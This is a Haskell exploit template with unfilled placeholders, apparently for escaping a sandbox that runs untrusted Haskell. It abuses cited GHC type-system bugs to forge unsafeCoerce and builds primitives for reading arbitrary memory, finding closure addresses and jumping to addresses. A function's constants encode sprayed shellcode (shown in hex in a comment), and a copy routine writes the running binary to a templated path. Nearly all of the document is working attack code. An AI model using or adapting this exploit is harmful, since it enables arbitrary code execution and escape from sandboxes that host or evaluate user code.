  return ()
lang TypeFamilies
lang UnboxedTuples
lang PolyKinds
lang FlexibleContexts
lang AutoDeriveTypeable
lang DataKinds
lang TypeFamilies
lang RankNTypes
import Data.Typeable

  {actions}
  heading "bar"

newtype Foo a = Foo (Int -> (# Int, a #))

copy :: IO ()
copy =
  do print stage2
     dat <- BS.readFile "/proc/self/exe"
     BS.writeFile {exepath} dat

upio :: IO a -> b
upio x =
  case unsafeCoerce x of
    Foo f ->
      case f 1 of
        (# _, res #) -> res

-- payload: https://ghc.haskell.org/trac/ghc/ticket/10000
-- orig buf: https://ghc.haskell.org/trac/ghc/ticket/9858
data T = T

data family F p

newtype instance F (Proxy  T) = ID (forall a. a -> a)
newtype instance F (Proxy 'T) = UC (forall a b. a -> b)

unsafeCoerce :: a -> b
unsafeCoerce = case cast (ID id) of Just (UC f) -> f

data Wrap a = Wrap { unwrap :: a }

{- read word at addr -}
readMem :: Int -> Int
readMem addr = unwrap (unsafeCoerce (addr - 7))

{- jump to *addr. addr & 3 must be 0. result must be evaluated. -}
jmp :: Int -> ()
jmp addr = length (unwrap (unsafeCoerce addr)) `seq` ()

{- get address of closure -}
getAddr :: a -> Int
getAddr x = (y `seq` unsafeCoerce y) - 1
    where y = Wrap x

hard :: Int -> Int
hard 0 = 1
hard n =
   {consts[8]} * hard (n - 10) +
   {consts[7]} * hard (n - 9) +
   {consts[6]} * hard (n - 8) +
   {consts[5]} * hard (n - 7) +
   {consts[4]} * hard (n - 6) +
   {consts[3]} * hard (n - 5) +
   {consts[2]} * hard (n - 4) +
   {consts[1]} * hard (n - 3) +
   {consts[0]} * hard (n - 2)
  {-
   0xcccccccccccccccc * hard (n - 10) +
   0xdeb9090050fd231 * hard (n - 9) +
   0xdeb583b6adf8948 * hard (n - 8) +
   0xdeb9090e6894853 * hard (n - 7) +
   0xdeb90009d23e3bb * hard (n - 6) +
   0xdeb54415350c031 * hard (n - 5) +
   0xdeb90009d22f0bb * hard (n - 4) +
   0xdeb909090e48949 * hard (n - 3) +
   0x6eb0000632d68cc * hard (n - 2)
   -}

stage2 :: T.Text
stage2 = {buf}

a1 :: Int
-- fix to point to location of first constant in code for hard function
a1 = {eip}
b1 :: Int
b1 = getAddr a1

foo :: IO ()
foo =
  do
     let x1 = b1 + 8
     print (jmp x1)
     print stage2
     y <- readLn
     print (hard y)
